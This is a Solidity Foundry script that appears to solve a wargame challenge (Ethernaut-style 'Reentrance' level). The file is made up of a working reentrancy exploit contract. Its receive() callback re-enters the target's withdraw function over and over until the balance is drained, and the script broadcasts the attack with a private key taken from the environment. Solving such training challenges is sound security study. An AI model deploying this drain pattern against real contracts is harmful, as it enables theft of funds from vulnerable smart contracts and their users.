pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;
import "../instances/Ilevel10.sol";
import "forge-std/Test.sol";

contract Level10 is Test {
    Reentrance level10 =
        Reentrance(payable(0x24db326aDe282644c5e8a6A2f6284c968F61214E));

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPrivateKey);
        ReentranceExploiter reentranceExploiter = new ReentranceExploiter();
        reentranceExploiter.attack{value: 0.01 ether}(address(level10));
        require(address(level10).balance == 0, "balance not 0");
        vm.stopBroadcast();
    }
}

contract ReentranceExploiter {
    uint256 donated;
    Reentrance target;

    function attack(address _target) external payable {
        target = Reentrance(payable(_target));
        target.donate{value: msg.value}(address(this));
        donated = msg.value;
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance == 0) return;
        if (address(target).balance >= donated) {
            target.withdraw(donated);
        } else {
            target.withdraw(address(target).balance);
        }
    }
}
